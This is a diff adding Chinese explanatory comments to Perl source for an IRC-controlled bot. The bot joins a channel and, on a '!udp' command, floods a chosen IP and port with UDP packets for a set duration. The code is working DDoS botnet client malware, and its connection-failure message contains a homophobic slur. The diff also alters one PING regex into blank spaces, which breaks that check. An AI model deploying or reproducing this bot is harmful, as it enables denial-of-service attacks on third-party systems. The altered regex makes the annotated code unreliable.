@@ -23,39 +23,39 @@ my $serverpass  = "";
 
 reconnect:
 my $nick;
-for ( 0 .. $maxnamechar ) { $nick .= chr( int( rand(25) + 65 ) ); }
+for ( 0 .. $maxnamechar ) { $nick .= chr( int( rand(25) + 65 ) ); }             # 產生隨機 $Nick，長度 $maxnamechar，字母 A - Z。
 my $login;
-for ( 0 .. $maxnamechar ) { $login .= chr( int( rand(25) + 65 ) ); }
+for ( 0 .. $maxnamechar ) { $login .= chr( int( rand(25) + 65 ) ); }            # 產生隨機 $login，長度 $maxnamechar，字母 A - Z。
 
-my $sock = new IO::Socket::INET(
+my $sock = new IO::Socket::INET(                                                # 建立 Socket 連線。
     PeerAddr => $server,
     PeerPort => $serverport,
     Proto    => 'tcp'
-) or goto reconnect and print "fag\n";
+) or goto reconnect and print "fag\n";                                          # 連線建立失敗。
 
-if ( $serverpass = !'' ) {
-    print $sock "PASS $serverpass\r\n";
+if ( $serverpass = !'' ) {                                                      # 若有連線密碼則傳遞。
+    print $sock "PASS $serverpass\r\n";                                         # IRC 的封包格式如此，以 \r\n 結尾。
 }
 
 #Auth Ourselfs
-print $sock "NICK $nick\r\n";
-while ( my $input = <$sock> ) {
+print $sock "NICK $nick\r\n";                                                   # 傳遞 Nick 並且處理回覆：
+while ( my $input = <$sock> ) {                                                 # Socket 從伺服器接收訊息，放進 $input 中。
     
 	#Reconnect And Change Nick Name
 
-    if ( $input =~ /433/ ) {
-        goto reconnect;
+    if ( $input =~ /433/ ) {                                                    # IRC 的錯誤返回碼 433，Nickname 重複。    
+        goto reconnect;                                                         # 重新生成 $Nick 等，重新連線。
     }
-    elsif ( $input =~ /^PING(.*)$/i ) {
-        print $sock "PONG $1\r\n";
-        print "Connected..!\n";
-        print $sock "USER $login 8 * :Kawaii Bot\r\n";
-        if ( $input =~ /^PING(.*)$/i ) {
-            print $sock "PONG $1\r\n";
-            print $sock "JOIN $channel\r\n";
+    elsif ( $input =~ /^    (.*)$/i ) {                                         # 正則表達式
+        print $sock "PONG $1\r\n";                                              # $1 是上一行正則表達式的括號中的內容。
+        print "Connected..!\n";                                                 # 連線建立。
+        print $sock "USER $login 8 * :Kawaii Bot\r\n";                          # 用戶登錄名 $login，登錄模式 8，原名 Kawaii Bot。
+        if ( $input =~ /^PING(.*)$/i ) {                                        # PING、PONG 命令用于確認連線存活。
+            print $sock "PONG $1\r\n";                                          #
+            print $sock "JOIN $channel\r\n";                                    # 加入 IRC 頻道。
         }
 
-        last;
+        last;                                                                   # last 跳出現在所在的迴圈。
     }
 }
 my $user;
@@ -63,12 +63,12 @@ my $host;
 my $chnl;
 my $message;
 
-while (<$sock>) {
-    if ( $_ =~ /^PING(.*)$/i ) {
+while (<$sock>) {                                                               # 持續接收指令並且回應。
+    if ( $_ =~ /^PING(.*)$/i ) {                                                # PING、PONG 命令用于確認連線存活。
         print $sock "PONG $1\r\n";
     }
-    if ( $_ =~ /^:([^!]*)!(\S*) PRIVMSG (#\S+) :(.*)$/ ) {
-
+    if ( $_ =~ /^:([^!]*)!(\S*) PRIVMSG (#\S+) :(.*)$/ ) {                      # :($user)!($host) PRIVMSG ($chnl) :($message)
+                                                                                # $host 的 $user 向目標／頻道 $chnl 發送了 $message
 	$user    = $1;
 	$host    = $2;
 	$chnl    = $3;
@@ -76,32 +76,32 @@ while (<$sock>) {
 
 
 
-my ( $method, $ip, $port, $time, $packetsize, $other ) = split( / /, $message, 6 );
-
+my ( $method, $ip, $port, $time, $packetsize, $other ) = split( / /, $message, 6 ); # 將 $message 以空格切割成以上的變數。
+                                                                                # $message 長得像：$method $ip $port $time $packetsize $other
 
 #IRC Command Parsing / Sub calling
 
 
 
-        if ( $method =~ /^!quit\s*$/ ) {
-             die "Quitting!\n";
+        if ( $method =~ /^!quit\s*$/ ) {                                        # 當接收到的訊息是 !quit 時：
+             die "Quitting!\n";                                                 # 返回訊息 Quitting! 並且結束程式。
 	}
 	
-        if ( $method =~ /^!udp\s*$/ ) {
+        if ( $method =~ /^!udp\s*$/ ) {                                         # 當接收到的訊息是 !udp 時：
               my ( $iaddr, $endtime, $psize, $pport );
-        	    $iaddr = inet_aton("$ip") or print "Cant find host..\n";
-           	    $endtime = time() + ( $time ? $time : 1000000 );
-            	    socket( flood, PF_INET, SOCK_DGRAM, 17 );
+        	    $iaddr = inet_aton("$ip") or print "Cant find host..\n";        # 將 String $ip 類型轉換成 ip_address $iaddr
+           	    $endtime = time() + ( $time ? $time : 1000000 );                # 結束時間設定成 $endtime 之後，否則爲 1000000 
+            	    socket( flood, PF_INET, SOCK_DGRAM, 17 );                   # 建立一個 Socket。
             
-		print $sock "PRIVMSG $chnl :[UDP-Flood Started on $ip for $time seconds]\r\n";
+		print $sock "PRIVMSG $chnl :[UDP-Flood Started on $ip for $time seconds]\r\n"; # 向 IRC 發出訊息。
 
-            for ( ; time() <= $endtime ; ) {
-                $psize = $packetsize ? $packetsize : int( rand( 1024 - 64 ) + 64 );
-                $pport = $port ? $port : int( rand(65500) ) + 1;
+            for ( ; time() <= $endtime ; ) {                                    # 在結束時間到之前：
+                $psize = $packetsize ? $packetsize : int( rand( 1024 - 64 ) + 64 ); # 指定封包大小否則隨機。
+                $pport = $port ? $port : int( rand(65500) ) + 1;                # 指定連接的 port 否則隨機。
                 send( flood, pack( "a$psize", "flood" ), 0, pack_sockaddr_in( $pport, $iaddr )
-                );
+                );                                                              # 像目標發送封包。
             }
-            print $sock "PRIVMSG $chnl :[UDP-Flood Ended]\r\n";
+            print $sock "PRIVMSG $chnl :[UDP-Flood Ended]\r\n";                 # 向 IRC 發出訊息。
 	}
 	
 	
